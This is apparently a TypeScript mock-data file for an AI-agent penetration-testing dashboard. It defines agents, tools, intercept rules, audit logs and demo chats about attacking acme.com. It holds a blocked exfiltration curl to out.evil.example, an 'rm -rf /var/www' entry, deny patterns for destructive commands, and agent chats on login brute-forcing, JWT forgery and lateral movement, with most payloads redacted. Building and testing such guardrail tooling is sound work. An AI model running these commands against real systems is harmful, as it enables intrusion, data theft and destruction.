  "f-16": [{ traffic_id: "x-19", role: "proof", note: "Recorded request to the directory host. This preview did not send a new request." }],
  "f-17": [{ traffic_id: "x-19", role: "proof", note: "Recorded request to the directory host. This preview did not send a new request." }],
  "f-n1": [{ traffic_id: "x-n1", role: "proof", note: "Recorded request for the trading-site administration path." }],
  "f-n2": [{ traffic_id: "x-n2", role: "proof", note: "Recorded request to the mail host." }],
  "f-n3": [{ traffic_id: "x-n3", role: "proof", note: "Recorded request for the public file folder." }],
};

export const findingRetestSeeds: Array<{
  finding_id: string;
  verdict: "reproduced" | "fixed" | "inconclusive";
  summary: string;
}> = [
  {
    finding_id: "f-1",
    verdict: "reproduced",
    summary: "The recorded observation is still present. This preview did not send a request.",
  },
  {
    finding_id: "f-4",
    verdict: "fixed",
    summary: "The recorded observation was not reproduced. This preview did not send a request.",
  },
  {
    finding_id: "f-6",
    verdict: "inconclusive",
    summary: "This preview did not send a request, so the result is inconclusive.",
  },
];

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 312, block: 9 },
  entries: [
    {
      ts: T("2026-09-30T01:49:48Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -d 'username=admin...' https://admin.acme.com/login",
    },
    {
      ts: T("2026-09-30T02:01:15Z"),
      tool: "bash",
      action: "allow",
      command: "curl -s -b 'session=...' https://admin.acme.com/api/users",
    },
    {
      ts: T("2026-09-30T01:10:16Z"),
      tool: "bash",
      action: "block",
      reason: "Target out of bounds: out.evil.example is not within scope",
      command: "curl https://out.evil.example/exfil",
    },
    {
      ts: T("2026-09-29T23:12:35Z"),
      tool: "bash",
      action: "allow",
      command: "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-29T22:42:34Z"),
      tool: "bash",
      action: "block",
      reason: "Destructive command gating: rm -rf denied",
      command: "rm -rf /var/www",
    },
    {
      ts: T("2026-09-29T22:28:16Z"),
      tool: "bash",
      action: "allow",
      command: "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-29T20:00:34Z"),
      tool: "bash",
      action: "allow",
      command:
        "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-29T23:01:37Z"),
      tool: "bash",
      action: "allow",
      command: "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-30T00:08:19Z"),
      tool: "bash",
      action: "allow",
      command: "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-30T00:10:42Z"),
      tool: "bash",
      action: "block",
      reason: "Recorded observation. This preview did not run it.",
      command: "Recorded observation. This preview did not run it.",
    },
    {
      ts: T("2026-09-30T00:11:11Z"),
      tool: "bash",
      action: "allow",
      command: "Recorded observation. This preview did not run it.",
    },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  {
    id: "1",
    name: "Claude Opus 4.8",
    format: "anthropic",
    model: "claude-opus-4-8",
    api_key_hint: "…a3f2",
    rate_per_second: 0,
    rate_per_minute: 0,
    context_window_k: 1000,
    thinking_type: "enabled",
    reasoning_effort: "high",
    is_default: true,
    priority: 0,
    pool_exclude: false,
    // anthropic The field names of are fixed, so max_tokens_field Always empty.
    max_tokens: 0,
    max_tokens_field: "",
  },
  {
    id: "2",
    name: "DeepSeek V4",
    format: "openai",
    base_url: "https://api.deepseek.com",
    model: "deepseek-v4-flash",
    api_key_hint: "…9c11",
    rate_per_second: 0,
    rate_per_minute: 60,
    context_window_k: 128,
    thinking_type: "",
    reasoning_effort: "",
    is_default: false,
    priority: 10,
    pool_exclude: false,
    // openai Format + Inference model: upper limit max_completion_tokens.
    max_tokens: 8192,
    max_tokens_field: "max_completion_tokens",
  },
];

export const llmConfig = {
  configured: true,
  provider: "anthropic",
  model: "claude-opus-4-8",
  base_url: "",
  proxy: "",
  key_set: true,
  rate_per_second: 0,
  rate_per_minute: 0,
  context_window_k: 1000,
  thinking_type: "enabled",
  reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  {
    id: "1001",
    key: "retester",
    name: "Vulnerability retest",
    role: "assistant",
    builtin: false,
    enabled: true,
    description: "Start manually from vulnerability details and save independent retest conclusions",
    max_turns: 0,
    mcp_count: 0,
    skill_count: 0,
    tool_count: 2,
  },
  {
    id: "1",
    key: "goals",
    name: "Target Disassembler",
    role: "goals",
    builtin: true,
    enabled: true,
    description: "Split the mission goal into explorable sub-goals",
    max_turns: 8,
    mcp_count: 0,
    skill_count: 1,
    tool_count: 3,
  },
  {
    id: "2",
    key: "planner",
    name: "Planner",
    role: "planner",
    builtin: true,
    enabled: true,
    description: "Read and explore routes, judge goal achievement, and generate intentions",
    max_turns: 0,
    mcp_count: 1,
    skill_count: 2,
    tool_count: 9,
  },
  {
    id: "3",
    key: "mainagent",
    name: "Main Agent",
    role: "mainagent",
    builtin: true,
    enabled: true,
    description: "People talk in the loop, injecting hints/high-quality intentions",
    max_turns: 0,
    web_search: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 11,
  },
  {
    id: "4",
    key: "worker",
    name: "Work Agent",
    role: "worker",
    builtin: true,
    enabled: true,
    description: "claim intent → run Kali tool → graph writeback",
    max_turns: 40,
    run_seconds: 1800,
    web_search: false,
    interactive_shell: true,
    mcp_count: 2,
    skill_count: 3,
    tool_count: 14,
  },
  {
    id: "5",
    key: "recon-bot",
    name: "Reconnaissance robot (customized)",
    role: "custom",
    builtin: false,
    enabled: true,
    description: "Periodically conduct passive reconnaissance on new assets",
    max_turns: 12,
    mcp_count: 1,
    skill_count: 1,
    tool_count: 4,
  },
];

const promptVars: PromptVar[] = [
  { name: "Goal", description: "Current mission goal", example: "Get acme.com backend management rights", source: "runtime" },
  { name: "AssetSummary", description: "Asset Map Overview", example: "6 subdomains / 3 IPs / 4 applications / 4 endpoints", source: "distilled" },
  { name: "RouteHint", description: "Exploration route tips", example: "Priority backend and API override", source: "exploration" },
];

const promptVersions: PromptVersion[] = [
  { version: 3, ts: T("2026-09-29T17:28:06Z"), note: "Strengthening detection and guidance of unauthorized use", template_text: "You are the planner of ARTEX…" },
  { version: 2, ts: T("2026-09-19T21:53:55Z"), note: "First version fine-tuning", template_text: "You are the planner of ARTEX (v2)…" },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `You are ARTEX's ${a.name}.\nGoal: {{.Goal}}\nAsset summary: {{.AssetSummary}}\nRoute hint: {{.RouteHint}}\nContinue the assessment from the information above and write results back to the graph with tools.`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default: "The time/steps are almost up, please summarize the confirmed findings and mark the intended final state.",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "The task has timed out, please end it immediately and drop the current conclusion.",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  {
    id: 1,
    name: "shodan",
    transport: "http",
    url: "https://mcp.shodan.io/sse",
    args: [],
    env: {},
    enabled: true,
    tools: ["host_info", "search", "dns_resolve"],
  },
  {
    id: 2,
    name: "playwright",
    transport: "stdio",
    command: "npx",
    args: ["-y", "@playwright/mcp"],
    env: {},
    enabled: true,
    tools: ["browser_navigate", "browser_click", "browser_snapshot"],
  },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "Query the Shodan host information of a certain IP" },
    { name: "search", description: "Shodan Search" },
    { name: "dns_resolve", description: "DNS resolution" },
  ],
  2: [
    { name: "browser_navigate", description: "Browser opens URL" },
    { name: "browser_click", description: "Click element" },
    { name: "browser_snapshot", description: "Grab an accessibility snapshot" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  {
    name: "api-recon",
    description: "Reconnaissance and enumeration of privileges for REST/GraphQL APIs; used when discovering new API endpoints.",
    license: "MIT",
    mcps: [],
    files: ["SKILL.md", "scripts/enum.py"],
    calls: 24,
    tasks: 6,
    usage_agents: ["worker", "planner"],
    last_used: "2026-10-12T02:23:55Z",
  },
  {
    name: "playwright-cli",
    description: "Use Playwright to drive the browser for dynamic crawling and screenshots; use it when you need to render a JS site.",
    mcps: ["playwright"],
    files: ["SKILL.md"],
    calls: 7,
    tasks: 3,
    usage_agents: ["worker"],
    last_used: "2026-10-11T20:54:12Z",
  },
  {
    name: "scopesentry",
    description: "Pull assets from ScopeSentry and merge them into the company scope; used when importing assets in batches.",
    files: ["SKILL.md", "assets/mapping.md"],
    calls: 0,
    tasks: 0,
    usage_agents: [],
  },
];

export const skillCalls: SkillCall[] = [
  { ts: "2026-10-12T02:23:55Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
  { ts: "2026-10-12T01:51:02Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
  { ts: "2026-10-11T19:07:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
];

export const missingSkills: MissingSkill[] = [
  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-10-12T01:30:33Z" },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  {
    key: "bash",
    system: true,
    description: "Execute shell commands in Kali environment (scoped/destructively gated)",
    schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
    agents: ["worker", "mainagent"],
    enabled: true,
    kind: "builtin",
    calls: 1842,
  },
  {
    key: "report_finding",
    system: true,
    description: "Report a security discovery and connect to relevant nodes",
    schema: {
      type: "object",
      properties: {
        vulnclass: { type: "string" },
        severity: { type: "string" },
        summary: { type: "string" },
        evidence: { type: "string" },
      },
      required: ["vulnclass", "severity", "summary"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 96,
  },
  {
    key: "upsert_asset",
    system: true,
    description: "Write/update asset node",
    schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
    agents: ["worker"],
    enabled: true,
    kind: "builtin",
    calls: 417,
  },
  {
    key: "list_goals",
    system: true,
    description: "List the goals and achievement status of the current task",
    schema: { type: "object", properties: {} },
    agents: ["planner"],
    enabled: true,
    kind: "builtin",
    calls: 238,
  },
  {
    key: "nuclei_scan",
    system: false,
    description: "Customization: Use nuclei to run the specified template",
    schema: {
      type: "object",
      properties: { target: { type: "string" }, template: { type: "string" } },
      required: ["target"],
    },
    agents: ["worker"],
    enabled: true,
    kind: "command",
    exec: { command: "nuclei", args: ["-u", "{{target}}"] },
    calls: 31,
  },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  agent_traffic_binding: false,
  llm_record: false,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  global_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
  llm_pool_enabled: true,
  llm_pool_bind_fallback: false,
  noa_compaction: false,
};

// ── LLM Polling (failover)──────────────────────────────────────────────────────
// demo:The active configuration is normal, but the standby configuration has just been blown due to insufficient balance and is cooling down..
export const llmPool: LLMPoolStatus = {
  enabled: true,
  bind_fallback: false,
  chain: [
    {
      profile_id: "1",
      name: "Claude Opus 4.8",
      model: "claude-opus-4-8",
      format: "anthropic",
      priority: 0,
      active: true,
      excluded: false,
      state: "ok",
      fails: 0,
      trips: 0,
      cooldown_secs: 0,
    },
    {
      profile_id: "2",
      name: "DeepSeek V4",
      model: "deepseek-v4-flash",
      format: "openai",
      priority: 10,
      active: false,
      excluded: false,
      state: "tripped",
      fails: 0,
      trips: 1,
      cooldown_secs: 42,
      last_error: "openai: status 402: insufficient balance",
      last_at: T("2026-09-30T00:13:05Z"),
    },
  ],
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const PAYMENT_HELD_COMMAND =
  "Describe the held payment-review command: a bash call that would change an order amount. This preview did not run it.";

export const interceptRules: InterceptRule[] = [
  {
    id: 1,
    name: "Destructive orders require approval",
    enabled: true,
    priority: 10,
    match_target: "tool_input",
    match_type: "regex",
    pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
    action: "ask",
    message: "Destructive command detected and requires manual approval",
    timeout_enabled: true,
    timeout_seconds: 120,
    timeout_action: "deny",
    created_at: T("2026-09-19T21:53:55Z"),
    updated_at: T("2026-09-19T21:53:55Z"),
  },
  {
    id: 2,
    name: "Outgoing traffic is directly rejected",
    enabled: true,
    priority: 20,
    match_target: "tool_input",
    match_type: "string",
    pattern: "exfil",
    action: "deny",
    message: "Suspected outgoing data",
    timeout_enabled: false,
    timeout_seconds: 0,
    timeout_action: "deny",
    created_at: T("2026-09-20T15:53:55Z"),
    updated_at: T("2026-09-20T15:53:55Z"),
  },
  {
    id: 3,
    name: "Payment changes require approval",
    enabled: true,
    priority: 5,
    match_target: "tool_input",
    match_type: "string",
    pattern: "order amount",
    action: "ask",
    message: "Payment changes require approval",
    timeout_enabled: true,
    timeout_seconds: 120,
    timeout_action: "deny",
    created_at: T("2026-09-30T02:23:55Z"),
    updated_at: T("2026-10-09T02:23:55Z"),
  },
];

export const interceptPending: InterceptPending[] = [
  {
    id: 101,
    rule_id: 3,
    task_id: "t-shop-pay",
    agent_name: "work#2",
    tool_name: "bash",
    tool_input: { command: PAYMENT_HELD_COMMAND },
    status: "pending",
    reason: "Payment changes require approval for finding f-10 on task t-shop-pay",
    created_at: T("2026-10-09T02:23:55Z"),
  },
];

export const interceptHistory: InterceptApprovalRow[] = [
  {
    id: 90,
    rule_id: 1,
    task_id: "t-acme-web",
    agent_name: "work#1",
    tool_name: "bash",
    tool_input: { command: "A destructive disk command was described and denied." },
    status: "denied",
    reason: "Destructive orders require approval",
    created_at: T("2026-09-29T22:13:58Z"),
    decided_at: T("2026-09-29T22:14:27Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "Destructive orders require approval",
  },
  {
    id: 91,
    task_id: "t-acme-api",
    agent_name: "work#2",
    tool_name: "bash",
    tool_input: { command: "A file-deletion command was described and denied." },
    status: "denied",
    reason: "[Model] Delete target production file (D4)",
    created_at: T("2026-09-29T21:16:48Z"),
    decided_at: T("2026-09-29T21:16:50Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "",
  },
  {
    id: 92,
    rule_id: 2,
    task_id: "t-acme-web",
    agent_name: "work#13",
    tool_name: "bash",
    tool_input: { command: "A directory-copy command was described and allowed." },
    status: "allowed",
    reason: "Outgoing traffic is directly rejected",
    created_at: T("2026-09-30T00:10:42Z"),
    decided_at: T("2026-09-30T00:11:11Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "Outgoing traffic is directly rejected",
  },
  {
    id: 93,
    task_id: "t-acme-web",
    agent_name: "work#7",
    tool_name: "bash",
    tool_input: { command: "A database cleanup command was described and denied." },
    status: "denied",
    reason: "[Model] Suspected backup table, unable to determine whether to produce data",
    created_at: T("2026-09-29T19:57:42Z"),
    decided_at: T("2026-09-29T19:58:10Z"),
    conv_title: "",
    conv_agent_key: "",
    rule_name: "",
  },
];

// Approval detail fixtures use harmless report-writing examples.
interceptHistory.unshift({
  id: 94,
  task_id: "t-acme-web",
  agent_name: "work#1",
  tool_name: "Write",
  tool_input: { path: "reports/summary.md", content: "# Check summary\n\nThis round of verification has been completed, and existing evidence and follow-up recommendations have been compiled." },
  status: "allowed",
  decision_source: "model",
  reason: "[Model] Write existing inspection conclusions into local reports without modifying business data.",
  created_at: T("2026-09-30T03:57:01Z"),
  decided_at: T("2026-09-30T03:57:02Z"),
  conv_title: "",
  conv_agent_key: "",
  rule_name: "",
});

interceptHistory.unshift({
  ...interceptPending[0],
  conv_title: "",
  conv_agent_key: "",
  rule_name: "Payment changes require approval",
});

export const interceptDetails: Record<number, InterceptAudit> = {
  94: {
    run_id: "demo-run-report",
    tool_use_id: "call-write-report",
    correlation: "exact",
    input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
    user_message: "Please organize the completed examination and write the conclusions and evidence index into reports/summary.md.\nKeep items to be verified and do not modify business data.",
    context: [
      { kind: "user", text: "Summarize the existing evidence in this round and generate an inspection summary." },
      {
        kind: "tool_use",
        tool: "Read",
        tool_use_id: "call-read-evidence",
        text: '{"path":"reports/evidence-index.json"}',
      },
      {
        kind: "tool_result",
        tool: "Read",
        tool_use_id: "call-read-evidence",
        text: "3 evidence indexes have been read.\nThe record contains the request time, result summary, and local file location.",
      },
    ],
    captured_at: T("2026-09-30T03:57:01Z"),
    initial_action: "allow",
    initial_reason: "[Model] Write existing inspection conclusions into local reports without modifying business data.",
    effective_action: "allow",
    config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
    profile_id: 1,
    execution_status: "succeeded",
    output: "Successfully wrote reports/summary.md\nA total of 68 characters are written.",
    execution_ended_at: T("2026-09-30T03:57:03Z"),
  },
  93: {
    run_id: "demo-run-review",
    tool_use_id: "call-pending-review",
    correlation: "exact",
    input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
    user_message: "Check the purpose of the backup table, and you need to confirm it first when deleting it.",
    context: [],
    captured_at: T("2026-09-29T19:57:42Z"),
    initial_action: "ask",
    initial_reason: "[Model] It is suspected to be a backup table, and it is impossible to determine whether the data is produced.",
    profile_id: 1,
    execution_status: "not_started",
  },
};

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [
  {
    id: 1,
    agent_key: "mainagent",
    title: "acme background entry point discussion",
    llm_profile_id: 1,
    pinned: true,
    pinned_at: T("2026-09-30T02:02:40Z"),
    created_at: T("2026-09-29T17:28:06Z"),
    updated_at: T("2026-09-30T01:53:09Z"),
  },
  {
    id: 2,
    agent_key: "mainagent",
    title: "API override aspect sorting",
    llm_profile_id: 2,
    created_at: T("2026-09-29T08:53:31Z"),
    updated_at: T("2026-09-29T09:31:38Z"),
  },
  {
    id: 3,
    agent_key: "mainagent",
    title: "Intranet Horizontal · DMZ→Domain Control Attack Path Planning",
    llm_profile_id: 1,
    created_at: T("2026-09-29T20:12:28Z"),
    updated_at: T("2026-09-30T00:20:14Z"),
  },
];

export const conversationMessages: Record<number, Activity[]> = {
  1: [
    { seq: 1, worker: "user", ts: T("2026-09-29T17:28:06Z"), kind: "user", summary: "Where is the backend and where to start?" },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:08Z"),
      kind: "thinking",
      summary: "Confirm the technology stack and protection (verification code/rate limit) of the login page of admin.acme.com before deciding to use the default password or a dictionary.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:09Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c11",
      summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'",
    },
    {
      seq: 4,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:09Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c11",
      summary: "element-ui\ncsrf",
      detail: "Element-UI backend, there is CSRF token but no verification code.",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:15Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c12",
      summary:
        "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:17Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c12",
      summary: "401\\n401\\n401\\n401\\n401",
      detail: "No lock/no verification code for 5 consecutive times → No rate limit, can be blasted.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-09-29T17:28:20Z"),
      kind: "text",
      summary:
        "Recorded observation. This preview did not run it.",
    },
    { seq: 8, worker: "user", ts: T("2026-09-30T01:53:09Z"), kind: "user", summary: "Is it done?" },
    {
      seq: 9,
      worker: "mainagent",
      ts: T("2026-09-30T01:53:11Z"),
      kind: "text",
      summary:
        "Recorded observation. This preview did not run it.",
    },
  ],
  2: [
    {
      seq: 1,
      worker: "user",
      ts: T("2026-09-29T08:53:31Z"),
      kind: "user",
      summary: "Summarize the authorization findings for api.acme.com.",
    },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-09-29T08:53:33Z"),
      kind: "thinking",
      summary: "First touch the API authentication method and the behavior of several key endpoints, and then judge the IDOR/JWT risks.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-09-29T08:53:36Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c21",
      summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'",
    },
    {
      seq: 4,
      worker: "mainagent",
      ts: T("2026-09-29T08:53:37Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c21",
      summary: '{ "id": 42, "role": "user" }',
      detail: "Normal user token is available.",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-09-29T08:53:45Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c22",
      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # See the algorithm",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-09-29T08:53:46Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c22",
      summary: '{"alg":"HS256","typ":"JWT"}',
      detail: "HS256 symmetric signature, if the key is weak, it can be forged offline.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-09-29T08:54:00Z"),
      kind: "text",
      summary:
        "Recorded observation. This preview did not run it.",
    },
  ],
  3: [
    {
      seq: 1,
      worker: "user",
      ts: T("2026-09-29T20:12:28Z"),
      kind: "user",
      summary: "The DMZ host is recorded. What should we verify next?",
    },
    {
      seq: 2,
      worker: "mainagent",
      ts: T("2026-09-29T20:12:31Z"),
      kind: "thinking",
      summary: "www-data does not have enough permissions to do intranet lateralization. First, upgrade local privileges; after getting root, use DMZ as pivot to do survival discovery.",
    },
    {
      seq: 3,
      worker: "mainagent",
      ts: T("2026-09-29T20:12:33Z"),
      kind: "text",
      summary:
        "The recorded DMZ account is limited. The notes include a local privilege change. This preview did not run it.",
    },
    {
      seq: 4,
      worker: "user",
      ts: T("2026-09-29T22:44:56Z"),
      kind: "user",
      summary: "3 stations were scanned on the intranet, and Jenkins 8080 is on. Is there any problem?",
    },
    {
      seq: 5,
      worker: "mainagent",
      ts: T("2026-09-29T22:45:00Z"),
      kind: "tool_use",
      tool: "bash",
      tool_use_id: "c31",
      summary: "Recorded a console check. This preview did not send it.",
    },
    {
      seq: 6,
      worker: "mainagent",
      ts: T("2026-09-29T22:45:02Z"),
      kind: "tool_result",
      tool: "bash",
      tool_use_id: "c31",
      summary: "200",
      detail: "/script can be accessed directly without authentication.",
    },
    {
      seq: 7,
      worker: "mainagent",
      ts: T("2026-09-29T22:45:06Z"),
      kind: "text",
      summary:
        "The stored console response did not require a sign-in. This preview did not send a new request.",
    },
    {
      seq: 8,
      worker: "user",
      ts: T("2026-09-29T23:51:39Z"),
      kind: "user",
      summary: "I have obtained the domain account. svc_deploy is Domain Admins. Can I directly access the domain control?",
    },
    {
      seq: 9,
      worker: "mainagent",
      ts: T("2026-09-29T23:51:43Z"),
      kind: "text",
      summary:
        "Recorded observation. This preview did not run it.",
    },
    { seq: 10, worker: "user", ts: T("2026-09-30T00:18:48Z"), kind: "user", summary: "The recorded goal is met. What should the note say?" },
    {
      seq: 11,
      worker: "mainagent",
      ts: T("2026-09-30T00:18:54Z"),
      kind: "text",
      summary:
        "Recorded observation. This preview did not run it.",
    },
  ],
};

// ── Asset test coverage(/tasks/{id}/coverage)──
export const coverage = {
  enabled: true,
  scope_rows: 4,
  denominator: 26,
  tested: 11,
  pct: 11 / 26,
  by_type: [
    { type: "subdomain", total: 6, tested: 4 },
    { type: "service", total: 9, tested: 4 },
    { type: "endpoint", total: 8, tested: 2 },
    { type: "ip", total: 3, tested: 1 },
  ],
};

// ── Asset coverage map(/tasks/{id}/coverage-graph)──
export const coverageGraph = {
  nodes: [
    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
    {
      key: "a:1",
      kind: "root_domain",
      label: "acme.com",
      tested: false,
      in_scope: false,
      asset_id: 1,
      domain: "acme.com",
      company_id: 1,
    },
    {
      key: "a:2",
      kind: "subdomain",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 2,
      domain: "www.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:3",
      kind: "subdomain",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 3,
      domain: "api.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:4",
      kind: "subdomain",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 4,
      domain: "admin.acme.com",
      root_domain: "acme.com",
    },
    {
      key: "a:5",
      kind: "service",
      label: "www.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 5,
      domain: "www.acme.com",
      url: "https://www.acme.com",
      port: 443,
      page_title: "Acme Home Page",
      status_code: 200,
    },
    {
      key: "a:6",
      kind: "endpoint",
      label: "https://www.acme.com/search",
      tested: true,
      in_scope: true,
      asset_id: 6,
      url: "https://www.acme.com/search?q=",
      domain: "www.acme.com",
    },
    {
      key: "a:7",
      kind: "service",
      label: "api.acme.com",
      tested: true,
      in_scope: true,
      asset_id: 7,
      domain: "api.acme.com",
      url: "https://api.acme.com",
      port: 443,
      page_title: "API Gateway",
      status_code: 401,
    },
    {
      key: "a:8",
      kind: "endpoint",
      label: "https://api.acme.com/v1/orders",
      tested: false,
      in_scope: true,
      asset_id: 8,
      url: "https://api.acme.com/v1/orders?id=",
      domain: "api.acme.com",
    },
    {
      key: "a:9",
      kind: "service",
      label: "admin.acme.com",
      tested: false,
      in_scope: true,
      asset_id: 9,
      domain: "admin.acme.com",
      url: "https://admin.acme.com",
      port: 443,
      page_title: "Backend login",
      status_code: 200,
    },
    {
      key: "a:10",
      kind: "ip",
      label: "203.0.113.10",
      tested: true,
      in_scope: true,
      asset_id: 10,
      ip: "203.0.113.10",
      company_id: 1,
    },
  ],
  edges: [
    { src: "a:1", dst: "c:1" },
    { src: "a:2", dst: "a:1" },
    { src: "a:3", dst: "a:1" },
    { src: "a:4", dst: "a:1" },
    { src: "a:5", dst: "a:2" },
    { src: "a:6", dst: "a:5" },
    { src: "a:7", dst: "a:3" },
    { src: "a:8", dst: "a:7" },
    { src: "a:9", dst: "a:4" },
    { src: "a:10", dst: "c:1" },
  ],
};

export const northwindCoverage = {
  enabled: true,
  scope_rows: 2,
  denominator: 4,
  tested: 1,
  pct: 1 / 4,
  by_type: [
    { type: "root_domain", total: 1, tested: 0 },
    { type: "subdomain", total: 2, tested: 1 },
    { type: "ip", total: 1, tested: 0 },
  ],
};

export const northwindCoverageGraph: CoverageGraphData = {
  nodes: [
    { key: "c:2", kind: "company", label: "Northwind Trading", tested: false, in_scope: true, company_id: 2 },
    {
      key: "a:27",
      kind: "root_domain",
      label: "northwind.example",
      tested: false,
      in_scope: true,
      asset_id: 27,
      domain: "northwind.example",
      company_id: 2,
    },
    {
      key: "a:28",
      kind: "subdomain",
      label: "www.northwind.example",
      tested: true,
      in_scope: true,
      asset_id: 28,
      domain: "www.northwind.example",
      root_domain: "northwind.example",
    },
    {
      key: "a:29",
      kind: "subdomain",
      label: "mail.northwind.example",
      tested: false,
      in_scope: true,
      asset_id: 29,
      domain: "mail.northwind.example",
      root_domain: "northwind.example",
    },
  ],
  edges: [
    { src: "a:27", dst: "c:2" },
    { src: "a:28", dst: "a:27" },
    { src: "a:29", dst: "a:27" },
  ],
};

// ── The intent of the asset associated with this task/fact/Discover(/tasks/{id}/asset-refs)──
// Announcement board demo:Explore nodes → Its anchor assets. real backend read exploration_anchors,mock Here are a few static ones..
const NODE_ASSETS: Record<string, number[]> = {
  fi1: [3],
  fi2: [2, 4],
  fi3: [5],
  fiRce: [4],
  fiPriv: [19],
  fiJenkins: [21],
  i1: [2],
  i7: [4],
};

export function nodeAssetsFor(nodeId: string): FindingAsset[] {
  return (NODE_ASSETS[nodeId] ?? []).flatMap((id) => {
    const asset = assets.find((candidate) => candidate.id === id);
    return asset ? [assetRef(id)] : [];
  });
}

export function assetRefsFor(_assetId: number) {
  return {
    intents: [
      { id: 12, kind: "intent", state: "done", summary: "Perform SQL injection detection on www.acme.com search interface" },
      { id: 18, kind: "intent", state: "running", summary: "Object enumeration api.acme.com out of bounds (IDOR)" },
    ],
    facts: [{ id: 34, kind: "fact", state: "confirmed", summary: "search?q= parameters can be injected, and the error message will display MySQL syntax error." }],
    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[High] SQL Injection www.acme.com/search?q=" }],
  };
}

// ── Workspace (/workspace). Keyed by real task ids. No scripts or payloads. ──
const WS_FILES: Record<string, string> = {};

function rememberFile(path: string, content: string) {
  WS_FILES[path] = content;
}

function scopeNote(taskId: string): string {
  const task = tasks.find((item) => item.id === taskId);
  const hosts =
    taskId === "t-acme-web"
      ? [
          "acme.com",
          "www.acme.com",
          "admin.acme.com",
          "api.acme.com",
          "shop.acme.com",
          "vpn.acme.com",
          "203.0.113.10",
          "203.0.113.11",
          "10.10.10.0/24",
        ]
      : taskId === "t-acme-api"
        ? ["api.acme.com"]
        : taskId === "t-shop-pay"
          ? ["shop.acme.com"]
          : taskId === "t-vpn-edge"
            ? ["vpn.acme.com", "198.51.100.20"]
            : taskId === "t-northwind"
